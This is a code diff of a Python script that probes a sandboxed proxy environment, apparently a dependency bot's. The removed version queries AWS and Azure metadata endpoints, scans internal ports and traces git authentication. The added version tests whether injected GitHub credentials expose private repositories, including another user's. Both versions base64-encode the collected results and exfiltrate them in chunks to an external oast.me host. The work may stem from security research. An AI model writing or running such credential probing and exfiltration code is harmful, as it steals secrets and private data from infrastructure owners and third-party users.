@@ -1,91 +1,80 @@
-import os
-import base64
-import json
-import socket
-import subprocess
-import urllib.request
-import pathlib
+import os, urllib.request, base64, json, subprocess
 
 results = {}
 
-# 1. Metadata - direct (NO proxy) using ProxyHandler({})
-handler = urllib.request.ProxyHandler({})
-opener = urllib.request.build_opener(handler)
+# Test: Does the proxy inject credentials for other GitHub services?
 
-# AWS metadata
+# 1. git ls-remote on raw.githubusercontent.com (different subdomain)
 try:
-    resp = opener.open(urllib.request.Request('http://169.254.169.254/latest/meta-data/'), timeout=3)
+    r = subprocess.run(['git', 'ls-remote', 'https://raw.githubusercontent.com/toofikz2/depbot-impact-test', 'HEAD'],
+                       capture_output=True, text=True, timeout=10)
+    results['git_raw'] = f'rc={r.returncode} out={r.stdout[:50]} err={r.stderr[:80]}'
+except Exception as e:
+    results['git_raw'] = str(e)[:80]
+
+# 2. HTTP to npm.pkg.github.com through proxy (check if credential injected)
+try:
+    req = urllib.request.Request('https://npm.pkg.github.com/@tooforg/test')
+    resp = urllib.request.urlopen(req, timeout=5)
     data = resp.read()
-    results['aws_direct'] = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
-    results['aws_direct'] = results['aws_direct'][:300]
+    results['npm_pkg'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
 except Exception as e:
-    results['aws_direct'] = str(e)[:100]
+    results['npm_pkg'] = str(e)[:100]
 
-# Azure metadata
+# 3. GitHub GraphQL API through proxy
 try:
-    req = urllib.request.Request('http://169.254.169.254/metadata/instance?api-version=2021-02-01')
-    req.add_header('Metadata', 'true')
-    resp = opener.open(req, timeout=3)
+    req = urllib.request.Request('https://api.github.com/graphql')
+    req.add_header('Content-Type', 'application/json')
+    req.data = b'{"query":"{ viewer { login } }"}'
+    resp = urllib.request.urlopen(req, timeout=5)
     data = resp.read()
-    results['azure_direct'] = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
-    results['azure_direct'] = results['azure_direct'][:300]
+    results['graphql'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
 except Exception as e:
-    results['azure_direct'] = str(e)[:100]
+    results['graphql'] = str(e)[:100]
 
-# 2. Metadata via proxy
+# 4. GitHub API /repos endpoint through proxy (different from /user)
 try:
-    resp = urllib.request.urlopen('http://169.254.169.254/latest/meta-data/', timeout=3)
+    req = urllib.request.Request('https://api.github.com/repos/toofikz2/depbot-impact-test')
+    resp = urllib.request.urlopen(req, timeout=5)
     data = resp.read()
-    results['aws_proxy'] = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
-    results['aws_proxy'] = results['aws_proxy'][:300]
+    results['api_repos'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
 except Exception as e:
-    results['aws_proxy'] = str(e)[:100]
+    results['api_repos'] = str(e)[:100]
 
-# 3. Internal hosts direct
-for name, url in [('gateway', 'http://172.19.0.1/'), ('proxy', 'http://172.19.0.2:1080/')]:
-    try:
-        resp = opener.open(urllib.request.Request(url), timeout=3)
-        data = resp.read()
-        results[name] = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
-        results[name] = results[name][:200]
-    except Exception as e:
-        results[name] = str(e)[:100]
-
-# 4. Port scan of proxy host
-open_ports = []
-for port in [80, 443, 1080, 3128, 8080, 8443, 9090, 3000, 5000]:
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(1)
-        if s.connect_ex(('172.19.0.2', port)) == 0:
-            open_ports.append(port)
-        s.close()
-    except:
-        pass
-results['proxy_open_ports'] = open_ports
-
-# 5. Full git trace with auth detail
+# 5. Test ghcr.io (GitHub Container Registry)
 try:
-    r = subprocess.run(
-        ['git', 'ls-remote', 'https://github.com/toofikz2/depbot-impact-test.git', 'HEAD'],
-        capture_output=True, text=True, timeout=15,
-        env={**os.environ, 'GIT_CURL_VERBOSE': '2', 'GIT_TRACE_CURL': '/tmp/gittrace.log'}
-    )
-    try:
-        trace = pathlib.Path('/tmp/gittrace.log').read_text()[:1000]
-        results['git_trace_curl'] = trace
-    except:
-        results['git_trace_curl'] = 'trace file not created'
-    results['git_stderr'] = r.stderr[:400]
+    req = urllib.request.Request('https://ghcr.io/v2/')
+    resp = urllib.request.urlopen(req, timeout=5)
+    data = resp.read()
+    results['ghcr'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
 except Exception as e:
-    results['git_stderr'] = str(e)[:100]
+    results['ghcr'] = str(e)[:100]
+
+# 6. Test if we can read PRIVATE repo content through the proxy
+# (the credential might allow content access via raw.githubusercontent.com)
+try:
+    req = urllib.request.Request('https://raw.githubusercontent.com/tooforg/private-test-repo/main/README.md')
+    resp = urllib.request.urlopen(req, timeout=5)
+    data = resp.read()
+    results['private_raw'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
+except Exception as e:
+    results['private_raw'] = str(e)[:100]
+
+# 7. Test accessing ANOTHER USER's private repo via git through proxy
+try:
+    r = subprocess.run(['git', 'ls-remote', 'https://github.com/toofikz1/personal-secret-repo.git', 'HEAD'],
+                       capture_output=True, text=True, timeout=10,
+                       env={**os.environ, 'GIT_TERMINAL_PROMPT': '0'})
+    results['crossuser_git'] = f'rc={r.returncode} out={r.stdout[:50]} err={r.stderr[:80]}'
+except Exception as e:
+    results['crossuser_git'] = str(e)[:80]
 
 # Exfil
 payload = base64.urlsafe_b64encode(json.dumps(results).encode()).decode()
-chunks = [payload[i:i+1800] for i in range(0, min(len(payload), 18000), 1800)]
+chunks = [payload[i:i+1800] for i in range(0, min(len(payload), 14000), 1800)]
 for i, chunk in enumerate(chunks):
     try:
-        urllib.request.urlopen('http://d99nibe1b2etnockvmb0erm7ukhz99koq.oast.me/v10/' + str(i) + '?d=' + chunk, timeout=5)
+        urllib.request.urlopen('http://' + 'd99nibe1b2etnockvmb0erm7ukhz99koq.oast.me' + '/v11/' + str(i) + '?d=' + chunk, timeout=5)
     except:
         pass
 
